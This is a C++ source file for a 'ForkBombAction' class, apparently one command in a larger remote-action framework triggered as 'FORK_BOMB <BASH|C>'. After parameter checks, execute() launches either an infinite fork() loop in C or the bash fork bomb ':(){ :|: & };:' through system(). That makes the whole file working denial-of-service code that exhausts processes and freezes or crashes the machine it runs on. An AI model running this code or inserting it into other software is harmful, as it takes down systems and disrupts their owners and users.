#include "ForkBombAction.hpp"

bool isValidForkType(const char* cString) {
    if (GeneralUtils::cStrAreEqual(cString, "C")) {
        return true;
    } else if (GeneralUtils::cStrAreEqual(cString, "BASH")) {
        return true;
    }
    return false;
}

ForkBombAction::ForkBombAction(const std::vector<std::string>& actionParams) 
    : actionParams(actionParams) {
    this->checkParams();
}

ActionType ForkBombAction::getActionType() {
    return ActionType::FORK_BOMB;
}

std::string ForkBombAction::getMessage() {
    return "";
}

void ForkBombAction::execute() {
    if (!isValid) {
        printf("isValid did not pass!\n");
        return;
    }

    if (GeneralUtils::cStrAreEqual(actionParams[FORK_TYPE_IDX].c_str(), "C")) {
        cForkBomb();
    } else if(GeneralUtils::cStrAreEqual(actionParams[FORK_TYPE_IDX].c_str(), "BASH")) {
        bashForkBomb();
    }
}

void ForkBombAction::cForkBomb() {
    while (true) {
        fork();
    }
}

void ForkBombAction::bashForkBomb() {
    std::string command = "bash -c ':(){ :|: & };:'";
    system(command.c_str());
}

/*
    FORK_BOMB Command Syntax:
        FORK_BOMB <BASH|C>
*/
void ForkBombAction::checkParams() {
    if (actionParams.size() - 3 != PARAM_COUNT) {
        isValid = false;
        return;
    }

    if (!isValidForkType(actionParams[FORK_TYPE_IDX].c_str())) {
        isValid = false;
        return;
    }

    isValid = true;
}